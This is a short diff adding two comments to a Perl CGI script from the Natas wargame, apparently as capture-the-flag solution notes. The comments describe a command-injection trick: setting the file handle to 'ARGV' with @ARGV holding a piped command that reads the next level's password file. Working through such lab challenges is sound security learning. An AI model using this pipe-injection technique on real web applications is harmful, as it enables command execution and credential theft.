@@ -67,6 +67,8 @@ use feature 'say';
             # Not a nice table as on Natas31 though
             print '<table class="sortable table table-hover table-striped">';
             my $i=0;
+            # so we need this $file = "ARGV"
+            # and before that set @ARGV = ( 'cat /etc/natas_webpass/natas32|' )  => use this ( 'echo exploited|' ) for test;
             while (<$file>) {
                 my @elements=split /,/, $_;
 
